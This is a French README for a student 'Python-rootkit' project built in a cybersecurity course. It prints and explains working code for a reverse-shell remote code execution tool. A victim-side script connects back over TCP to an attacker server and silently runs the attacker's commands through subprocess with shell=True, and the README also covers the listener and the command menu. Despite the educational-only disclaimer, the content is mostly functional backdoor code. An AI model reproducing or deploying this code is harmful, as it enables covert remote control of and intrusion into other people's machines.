![Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Python_logo_and_wordmark.svg/2560px-Python_logo_and_wordmark.svg.png)

**Python-rootkit** est un projet issu d'un cours d'1 jour. Il s'agit d'un rootkit en cours de développement permettant de l'exécution de code à distance (**RCE: Remote Code Execution**)

> **Il s'agit d'un programme à portée éducative uniquement et ne doit être utilisé que comme tel sur du matériel appartenant à l'utilisateur.**

# Description du projet
Le projet fonctionne de la façon suivante:
- Ouverture d'un socket TCP entre la victime (client) et l'attaquant (seveur)
- *Switch-case* permettant à l'attaquant de choisir parmis une sélection de choix (ouverture d'un shell, transfert de fichier,...)
- Exécution "transparente" côté victime: pas d'impression en console des commandes saisies par l'attaquant

## Etat d'avancement du projet

- [x] Ouverture d'un socket TCP
- [x] Création d'un menu type *prompt*
- [x] Conversion du menu en switch-case 
- [ ] Création d'un menu interactif côté attaquant
- [ ] Compatibilité Windows pour l'exécution de code (encodage défaillant)
- [ ] Transfert de fichiers

## Dépendances du projet
Ce programme ne repose que sur des bibliothèques Python de base.

### Mise en réseau
Sur la machine exécutant le code attaquant, il est nécessaire de s'assurer que le flux TCP puisse passer. Il convient de: 

1) Créer une **règle de pare-feu** en conséquences côté **serveur**
2) En cas de NAT: **rediriger le port** spécifié dans ```victime.py``` vers celui spécifié dans ```attaquant.py```

# Utilisation
## Prérequis
### Préparation de l'environnement de travail
Il est fortement recommandé d'exécuter ce programme dans une machine virtuelle.

- Création d'un environnement virtuel: ```python -m venv env```

- Activation de cet environnement virtuel: ```./env/Scripts/activate```

## Modification des variables

Plusieurs variables sont à modifier:
- Côté client (victime):
  -  Adresse IP du serveur
  -  Port du serveur
- Côté serveur:
   - Port à utiliser
   - Adresse IP sur laquelle écouter le flux

## Exécution

Le programme s'exécute en saisissant ```python attaquant.py``` côté serveur et ```python victime.py``` côté client.

Si l'exécution fonctionne, le prompt côté serveur devient ```FB >>``` et attend que l'on spécifie une fonction.

### Fonctions

- ```shell``` : permet d'ouvrir un shell distant
- ```help``` : affiche un prompt d'aide
- ```exit``` : permet de quitter le programme
- ```recv_file``` (à venir) : permet de télécharger un fichier distant

# Fonctionnement du code
1) # Serveur
```attaquant.py``` contient le code "serveur" ouvrant un socket TCP pour communiquer avec le code déployé côté victime.

### Déconstruction:
```python 
class Shell
``` 
> Est la classe contenant les fonctions utilisées par le  programme attaquant


```python 
match action:

    case "shell":
        print("[DEBUG]: " + action)
        while True:
            shell = Shell.command()
            if shell == "exit":
                break

    case "exit":
        print("[DEBUG]: " + action)
        conn.close()
        s.close()
        exit()

    case "recv archive":
        print("[DEBUG]: " + action)
        Shell.recv_archive(shell_python)
        if(not shell_python in action):
            if(action == shell in shell_python):
                return (" ")
            os.system(shell_python)
            print("\n")

    case "help":
        print("help")  
```
> Switch-case permettant d'exécuter du code côté serveur selon un prompt utilisateur (l'utilisateur peut ainsi choisir entre ```shell```, ```exit```, ```recv archive``` et ```help```).

```python
def home():
        conn.send("home".encode())
        HOME = conn.recv(1024).decode("utf-8")
        return(HOME)
```
> Définit la fonction ```home``` envoyant le mot ```home``` à la victime qui, une fois après l'avoir interprêté par la fonction correspondante, renverra en réponse le chemin du répertoire actuel via le socket ```conn```.

```python
def command():
    HOME = Shell.home()
    SHELL = str(input("%s>> "%(HOME)))
    if(SHELL == "exit"):
        SHELL = ""
        return("exit")
    conn.send("command".encode())
    sleep(1)
    conn.send(SHELL.encode())
    print(conn.recv(1024).decode("utf-8"))
```
> Définit la fonction ```command``` qui:
> - **Ligne 2**: demande à la victime le répertoire actuel (celui où est situé le fichier ```victime.py```)
> - **Ligne 3**: affiche un prompt à l'attaquant indiquant le répertoire d'exécution cible
> - **Ligne 4-5-6:** vérifie si l'attaquant a saisi ```exit``` et retourne ```exit``` ce qui quittera le shell
> - **Ligne 7-8**: envoie le mot ```command``` et attend 1 seconde
> - **Ligne 9**: envoie la commmande saisie par l'attaquant
> - **Ligne 10**: reçoit la réponse de la victime 

```python
IP = "hostname"
PORT = 12345
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((IP, PORT))
s.listen(10)
conn, client = s.accept()
welcome = conn.recv(1024)
print(welcome.decode("utf-8"))
```
> Définit les paramètres de base du programme attaquant (nom d'hôte et port) et initialise la connexion.

```python
while True:
    try:
        shell_python = str(input("\033[31m\033[1mFB \033[31m>>\033[1;32m "))
        Shell.verifications(shell_python)
    except KeyboardInterrupt:
        conn.close()
        s.close()
        exit()
```
> Initialise le shell interactif avec l'utilisateur et ferme le programme si la victime appuie sur ```Ctrl+C```.

2) # Client

```victime.py``` contient le code "client" à déployer sur la machine victime communiquant avec le serveur.

## Déconstruction

```python 
class Client
``` 
> Est la classe contenant les fonctions utilisées par le  programme victime

```python
def verifications(DATA):
    if(DATA == str.encode("command")):
        
        command = s.recv(1024)
        Client.command(command.decode("utf-8"))

    if(DATA == str.encode("home")):
        s.send(os.getcwd().encode())

    if(DATA == str.encode("exit")):
        s.close()
        exit()

    if(DATA == str.encode("filesend")):
        Client.send_archive(DATA)
```
> Vérifie le mot de contrôle envoyé par l'attaquant et définit comme sera interprêté l'élément suivant. 

```python
def command(DATA):
    sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = sub.stderr.read()+sub.stdout.read()
    s.send(output)
```
> Si le mot de contrôle est ```command```, la victime traîte ce qui suit à l'aide de cette fonction. ```DATA``` est alors le contenu envoyé par l'attaquant. 

```python
while True:
    try: 
        rcvc = s.recv(1024)
        Client.verifications(rcvc)
    except KeyboardInterrupt:
        s.close()
        exit()
```
> Initialise la réception des mots envoyés par l'attaquant et ferme le programme si la victime appuie sur ```Ctrl+C```.

# Crédits
## Auteur

Par François B, étudiant à l'école IPSSI en première année de master Cybersécurité & cloud-computing

Merci à Christian A, enseignants chercheurs

## Licence

Ce programme a été créé dans un but purement éducatif et n'est soumis en tant que tel à aucune licence.
Les licences des bibliothèques et interprêteurs utilisés s'appliquent.


